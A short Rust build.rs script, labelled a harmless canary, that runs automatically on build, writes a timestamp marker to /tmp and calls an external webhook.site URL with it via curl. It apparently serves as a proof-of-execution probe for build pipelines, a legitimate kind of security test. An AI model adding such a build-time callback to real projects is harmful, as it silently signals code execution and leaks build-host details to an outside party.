// lane3 revalidation: harmless canary only (no deps, no payload)
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

fn main() {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let mark = format!("L3BR_{nanos}");
    let _ = std::fs::write("/tmp/l3_buildrs_marker.txt", &mark);
    let url = format!("https://webhook.site/fee43431-0371-408a-87bf-0e44e84161cc/l3-buildrs?m={}", mark);
    let _ = Command::new("curl").args(["-s", "-m", "6", &url]).status();
    println!("cargo:warning=lane3 build.rs executed {}", mark);
}
